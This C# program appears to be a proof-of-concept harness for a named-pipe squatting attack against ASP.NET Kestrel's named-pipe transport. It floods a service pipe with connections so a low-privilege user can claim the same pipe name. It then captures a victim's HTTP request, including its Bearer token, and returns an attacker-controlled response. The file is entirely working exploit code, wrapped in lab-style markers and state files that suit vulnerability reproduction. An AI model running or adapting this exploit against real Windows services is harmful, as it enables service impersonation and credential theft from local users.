using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Server.Kestrel.Core;
using Microsoft.AspNetCore.Server.Kestrel.Transport.NamedPipes;

if (!OperatingSystem.IsWindows())
{
    Console.Error.WriteLine("WINDOWS_REQUIRED");
    return 77;
}

if (args.Length < 1)
{
    Console.Error.WriteLine("mode required");
    return 64;
}

return args[0] switch
{
    "server" => await RunServerAsync(args),
    "flood" => RunFlood(args),
    "claim" => await RunClaimAsync(args),
    "victim" => RunVictim(args),
    _ => 64,
};

static async Task<int> RunServerAsync(string[] args)
{
    if (args.Length != 5) return 64;
    var pipeName = args[1];
    var stateDir = args[2];
    var lowUserSid = new SecurityIdentifier(args[3]);
    var stopFile = args[4];
    Directory.CreateDirectory(stateDir);

    var serviceSid = WindowsIdentity.GetCurrent().User ?? throw new InvalidOperationException("service SID unavailable");
    var realVictimHits = 0;
    var builder = WebApplication.CreateBuilder();
    builder.Logging.ClearProviders();
    builder.Logging.AddSimpleConsole(o => { o.SingleLine = true; o.TimestampFormat = "HH:mm:ss.fff "; });
    builder.Logging.SetMinimumLevel(LogLevel.Debug);
    builder.WebHost
        .UseKestrel(options =>
        {
            options.Limits.RequestHeadersTimeout = TimeSpan.FromMinutes(10);
            options.Limits.KeepAliveTimeout = TimeSpan.FromMinutes(10);
            options.ListenNamedPipe(pipeName, listen => listen.Protocols = HttpProtocols.Http1);
        })
        .UseNamedPipes(options =>
        {
            options.ListenerQueueCount = 1;
            options.CurrentUserOnly = false;
            options.PipeSecurity = BuildSecurity(serviceSid, lowUserSid);
        });

    var app = builder.Build();
    app.MapGet("/probe", () => Results.Text("REAL_Kestrel_PROBE"));
    app.MapPost("/victim", async context =>
    {
        Interlocked.Increment(ref realVictimHits);
        await File.WriteAllTextAsync(Path.Combine(stateDir, "real-victim-hit.txt"), DateTimeOffset.UtcNow.ToString("O"));
        context.Response.ContentType = "text/plain";
        await context.Response.WriteAsync("REAL_Kestrel_VICTIM");
    });

    await app.StartAsync();
    await WriteJsonAsync(Path.Combine(stateDir, "host-ready.json"), new
    {
        utc = DateTimeOffset.UtcNow,
        serviceIdentity = WindowsIdentity.GetCurrent().Name,
        serviceSid = serviceSid.Value,
        lowUserSid = lowUserSid.Value,
        runtime = Environment.Version.ToString(),
        assembly = typeof(NamedPipeTransportOptions).Assembly.FullName,
        assemblyPath = typeof(NamedPipeTransportOptions).Assembly.Location,
        assemblySha256 = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(
            File.ReadAllBytes(typeof(NamedPipeTransportOptions).Assembly.Location))).ToLowerInvariant(),
    });

    while (!File.Exists(stopFile))
    {
        await Task.Delay(100);
    }

    await app.StopAsync(TimeSpan.FromSeconds(10));
    await app.DisposeAsync();
    await WriteJsonAsync(Path.Combine(stateDir, "host-stopped.json"), new
    {
        utc = DateTimeOffset.UtcNow,
        realVictimHits,
    });
    return 0;
}

static int RunFlood(string[] args)
{
    if (args.Length != 4) return 64;
    var pipeName = args[1];
    var stateDir = args[2];
    var releaseFile = args[3];
    Directory.CreateDirectory(stateDir);
    var clients = new List<NamedPipeClientStream>();
    string? error = null;
    try
    {
        for (var i = 0; i < 300; i++)
        {
            var client = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
            try
            {
                client.Connect(3_000);
                clients.Add(client);
            }
            catch (Exception ex)
            {
                error = $"{ex.GetType().FullName}: {ex.Message}";
                client.Dispose();
                break;
            }
        }

        WriteJson(Path.Combine(stateDir, "flood-ready.json"), new
        {
            utc = DateTimeOffset.UtcNow,
            identity = WindowsIdentity.GetCurrent().Name,
            sid = WindowsIdentity.GetCurrent().User?.Value,
            connected = clients.Count,
            failure = error,
        });

        while (!File.Exists(releaseFile))
        {
            Thread.Sleep(100);
        }
    }
    finally
    {
        foreach (var client in clients)
        {
            try { client.Dispose(); } catch { }
        }
        WriteJson(Path.Combine(stateDir, "flood-released.json"), new
        {
            utc = DateTimeOffset.UtcNow,
            connected = clients.Count,
        });
    }
    return clients.Count >= 250 ? 0 : 10;
}

static async Task<int> RunClaimAsync(string[] args)
{
    if (args.Length != 6) return 64;
    var pipeName = args[1];
    var stateDir = args[2];
    var phase = args[3];
    var serviceSid = new SecurityIdentifier(args[4]);
    var timeoutSeconds = int.Parse(args[5], System.Globalization.CultureInfo.InvariantCulture);
    Directory.CreateDirectory(stateDir);

    NamedPipeServerStream? server = null;
    string? lastError = null;
    var stopwatch = Stopwatch.StartNew();
    do
    {
        try
        {
            var lowSid = WindowsIdentity.GetCurrent().User ?? throw new InvalidOperationException("low SID unavailable");
            server = NamedPipeServerStreamAcl.Create(
                pipeName,
                PipeDirection.InOut,
                1,
                PipeTransmissionMode.Byte,
                PipeOptions.Asynchronous | PipeOptions.WriteThrough | PipeOptions.FirstPipeInstance,
                0,
                0,
                BuildClaimSecurity(lowSid, serviceSid));
            break;
        }
        catch (Exception ex)
        {
            lastError = $"{ex.GetType().FullName}: {ex.Message}";
            if (phase == "pre") break;
            await Task.Delay(100);
        }
    }
    while (stopwatch.Elapsed < TimeSpan.FromSeconds(timeoutSeconds));

    if (server is null)
    {
        await WriteJsonAsync(Path.Combine(stateDir, $"claim-{phase}.json"), new
        {
            utc = DateTimeOffset.UtcNow,
            identity = WindowsIdentity.GetCurrent().Name,
            sid = WindowsIdentity.GetCurrent().User?.Value,
            success = false,
            error = lastError,
            elapsedMs = stopwatch.ElapsedMilliseconds,
        });
        return phase == "pre" ? 0 : 10;
    }

    using (server)
    {
        var owner = server.GetAccessControl().GetOwner(typeof(SecurityIdentifier)) as SecurityIdentifier;
        await WriteJsonAsync(Path.Combine(stateDir, $"claim-{phase}.json"), new
        {
            utc = DateTimeOffset.UtcNow,
            identity = WindowsIdentity.GetCurrent().Name,
            sid = WindowsIdentity.GetCurrent().User?.Value,
            ownerSid = owner?.Value,
            success = true,
            elapsedMs = stopwatch.ElapsedMilliseconds,
        });

        if (phase == "pre") return 20;

        await File.WriteAllTextAsync(Path.Combine(stateDir, "claim-post-ready.txt"), DateTimeOffset.UtcNow.ToString("O"));
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds));
        await server.WaitForConnectionAsync(cts.Token);
        var request = await ReadHttpMessageAsync(server, cts.Token);
        await File.WriteAllTextAsync(Path.Combine(stateDir, "captured-request.txt"), request, new UTF8Encoding(false));

        const string body = "ATTACKER_PIPE_RESPONSE";
        var response = Encoding.ASCII.GetBytes(
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n" +
            $"Content-Length: {body.Length}\r\nConnection: close\r\n\r\n{body}");
        await server.WriteAsync(response, cts.Token);
        await server.FlushAsync(cts.Token);
        server.Disconnect();
    }
    return 0;
}

static int RunVictim(string[] args)
{
    if (args.Length != 5) return 64;
    var pipeName = args[1];
    var marker = args[2];
    var output = args[3];
    var timeout = int.Parse(args[4], System.Globalization.CultureInfo.InvariantCulture);
    var request =
        "POST /victim HTTP/1.1\r\nHost: localhost\r\n" +
        $"Authorization: Bearer {marker}\r\nContent-Type: text/plain\r\n" +
        $"Content-Length: {Encoding.UTF8.GetByteCount(marker)}\r\nConnection: close\r\n\r\n{marker}";
    var response = SendRawHttp(pipeName, request, timeout);
    File.WriteAllText(output, response, new UTF8Encoding(false));
    Console.WriteLine(response);
    return response.Contains("ATTACKER_PIPE_RESPONSE", StringComparison.Ordinal) ? 0 : 10;
}

static PipeSecurity BuildSecurity(SecurityIdentifier serviceSid, SecurityIdentifier lowSid)
{
    var security = new PipeSecurity();
    security.SetAccessRuleProtection(true, false);
    security.SetOwner(serviceSid);
    security.AddAccessRule(new PipeAccessRule(serviceSid, PipeAccessRights.FullControl, AccessControlType.Allow));
    security.AddAccessRule(new PipeAccessRule(lowSid, PipeAccessRights.ReadWrite | PipeAccessRights.Synchronize, AccessControlType.Allow));
    return security;
}

static PipeSecurity BuildClaimSecurity(SecurityIdentifier lowSid, SecurityIdentifier serviceSid)
{
    var security = new PipeSecurity();
    security.SetAccessRuleProtection(true, false);
    security.SetOwner(lowSid);
    security.AddAccessRule(new PipeAccessRule(lowSid, PipeAccessRights.FullControl, AccessControlType.Allow));
    security.AddAccessRule(new PipeAccessRule(serviceSid, PipeAccessRights.ReadWrite | PipeAccessRights.Synchronize, AccessControlType.Allow));
    return security;
}

static string SendRawHttp(string pipeName, string request, int timeoutMilliseconds)
{
    using var client = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
    client.Connect(timeoutMilliseconds);
    var requestBytes = Encoding.ASCII.GetBytes(request);
    client.Write(requestBytes);
    client.Flush();
    using var cts = new CancellationTokenSource(timeoutMilliseconds);
    return ReadToEndAsync(client, cts.Token).GetAwaiter().GetResult();
}

static async Task<string> ReadToEndAsync(Stream stream, CancellationToken cancellationToken)
{
    using var output = new MemoryStream();
    var buffer = new byte[8192];
    while (true)
    {
        var read = await stream.ReadAsync(buffer, cancellationToken);
        if (read == 0) break;
        output.Write(buffer, 0, read);
    }
    return Encoding.UTF8.GetString(output.ToArray());
}

static async Task<string> ReadHttpMessageAsync(Stream stream, CancellationToken cancellationToken)
{
    using var output = new MemoryStream();
    var buffer = new byte[8192];
    var headerEnd = -1;
    var contentLength = 0;
    while (true)
    {
        var read = await stream.ReadAsync(buffer, cancellationToken);
        if (read == 0) break;
        output.Write(buffer, 0, read);
        var data = output.ToArray();
        if (headerEnd < 0)
        {
            headerEnd = FindHeaderEnd(data);
            if (headerEnd >= 0)
            {
                contentLength = ParseContentLength(Encoding.ASCII.GetString(data, 0, headerEnd));
            }
        }
        if (headerEnd >= 0 && data.Length >= headerEnd + 4 + contentLength) break;
    }
    return Encoding.UTF8.GetString(output.ToArray());
}

static int FindHeaderEnd(byte[] data)
{
    for (var i = 0; i <= data.Length - 4; i++)
    {
        if (data[i] == 13 && data[i + 1] == 10 && data[i + 2] == 13 && data[i + 3] == 10) return i;
    }
    return -1;
}

static int ParseContentLength(string headers)
{
    foreach (var line in headers.Split("\r\n", StringSplitOptions.RemoveEmptyEntries))
    {
        if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase) &&
            int.TryParse(line[15..].Trim(), out var length)) return length;
    }
    return 0;
}

static void WriteJson(string path, object value)
    => File.WriteAllText(path, JsonSerializer.Serialize(value, new JsonSerializerOptions { WriteIndented = true }), new UTF8Encoding(false));

static Task WriteJsonAsync(string path, object value)
    => File.WriteAllTextAsync(path, JsonSerializer.Serialize(value, new JsonSerializerOptions { WriteIndented = true }), new UTF8Encoding(false));
